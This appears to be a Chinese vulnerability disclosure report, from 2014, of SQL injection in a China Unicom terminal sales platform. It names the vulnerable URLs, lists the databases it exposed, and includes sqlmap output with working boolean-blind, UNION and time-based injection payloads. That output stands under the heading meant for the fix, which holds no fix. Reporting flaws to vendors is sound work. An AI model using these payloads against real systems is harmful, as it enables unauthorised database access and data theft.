wybug_title: 中国联通某平台SQL注入（涉及9个数据库）
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-09-12：	细节已通知厂商并且等待厂商处理中									2014-09-17：	厂商已经确认，细节仅向厂商公开									2014-09-27：	细节向核心白帽子及相关领域专家公开									2014-10-07：	细节向普通白帽子公开									2014-10-17：	细节向实习白帽子公开									2014-10-27：	细节向公众公开  简要描述： 北京联通终端购销平台注入两枚 详细说明：  
http://dg.uninx.com:8481/dgpt/endpage.php?gid=87&shopid=4 gid=87http://dg.uninx.com/dgpt/endpage.php?gid=183&shopid=5 gid=183
   漏洞证明：  
available databases [9]:[*] 12316_xncdb[*] binlog[*] information_schema[*] mysql[*] nxdb[*] shequdb[*] test[*] zddg[*] zddg0315erqi
   修复方案：  
[root@Hacker~]# Sqlmap -u "http://dg.uninx.com:8481/dgpt/endpage.php?gid=87&shopid=4 gid=87" -v 1    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:58:19[10:58:19] [INFO] resuming back-end DBMS 'mysql'[10:58:19] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: gid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: gid=87 AND 4752=4752&shopid=4 gid=87 AND 4752=4752    Type: UNION query    Title: MySQL UNION query (NULL) - 74 columns    Payload: gid=87 LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a6274743a,0x4d52444f6c7846514f43,0x3a7676733a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#&shopid=4 gid=87 LIMIT 1,1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x3a6274743a,0x4d52444f6c7846514f43,0x3a7676733a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,NULL, NULL, NULL, NULL, NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: gid=87 AND SLEEP(5)&shopid=4 gid=87 AND SLEEP(5)---[10:58:20] [INFO] the back-end DBMS is MySQLweb application technology: Apache, PHP 5.2.5back-end DBMS: MySQL 5.0.11[10:58:20] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602).
